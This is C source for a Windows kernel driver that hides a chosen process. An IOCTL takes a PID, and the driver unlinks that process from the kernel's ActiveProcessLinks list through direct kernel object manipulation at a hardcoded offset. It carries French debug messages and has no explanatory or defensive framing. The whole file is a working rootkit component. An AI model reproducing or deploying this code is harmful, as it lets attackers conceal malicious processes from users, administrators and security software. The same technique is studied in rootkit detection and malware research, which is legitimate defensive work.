#include <ntddk.h>
#include "dkom.h"

#define DEVICE_NAME  L"\\Device\\DkomDriver"
#define SYMLINK_NAME L"\\??\\DkomDriverLink"

#define OFFSET_ACTIVE_PROCESS_LINKS 0x448

VOID HideProcess(_In_ PEPROCESS Process)
{
   PLIST_ENTRY current = (PLIST_ENTRY)((ULONG_PTR)Process + OFFSET_ACTIVE_PROCESS_LINKS);
    PLIST_ENTRY prev = current->Blink;
    PLIST_ENTRY next = current->Flink;

    prev->Flink = next;
    next->Blink = prev;

    current->Flink = current;
    current->Blink = current;

    DbgPrint("Dkom: process masque\n");
}

NTSTATUS DkomCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DispatchIoControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
    PIO_STACK_LOCATION stackLocation;
    NTSTATUS status = STATUS_SUCCESS;

    UNREFERENCED_PARAMETER(DeviceObject);
    stackLocation = IoGetCurrentIrpStackLocation(Irp);

    if (stackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_HIDE_PROCESS) {
        PULONG inBuf = (PULONG)Irp->AssociatedIrp.SystemBuffer;
        ULONG inLen = stackLocation->Parameters.DeviceIoControl.InputBufferLength;

        if (inBuf == NULL || inLen < sizeof(ULONG)) {
            status = STATUS_INVALID_PARAMETER;
        } else {
            ULONG targetPid = *inBuf;
            PEPROCESS targetProcess = NULL;
            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)targetPid, &targetProcess);
            if (NT_SUCCESS(status)) {
                DbgPrint("Dkom: masquage PID %lu\n", targetPid);
                HideProcess(targetProcess);
                ObDereferenceObject(targetProcess);
            } else {
               DbgPrint("Dkom: PID %lu introuvable 0x%08X\n", targetPid, status);
            }
        }
    } else {
        status = STATUS_INVALID_DEVICE_REQUEST;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID DkomUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symLink);
    if (DriverObject->DeviceObject != NULL)
        IoDeleteDevice(DriverObject->DeviceObject);
    DbgPrint("Dkom: unloaded\n");
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    NTSTATUS status;
    UNICODE_STRING deviceName, symLink;
    PDEVICE_OBJECT deviceObject = NULL;

    UNREFERENCED_PARAMETER(RegistryPath);

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    status = IoCreateDevice(DriverObject, 0, &deviceName,
                            FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    status = IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DkomCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DkomCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoControl;
    DriverObject->DriverUnload = DkomUnload;
    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("Dkom: loaded\n");
    return STATUS_SUCCESS;
}
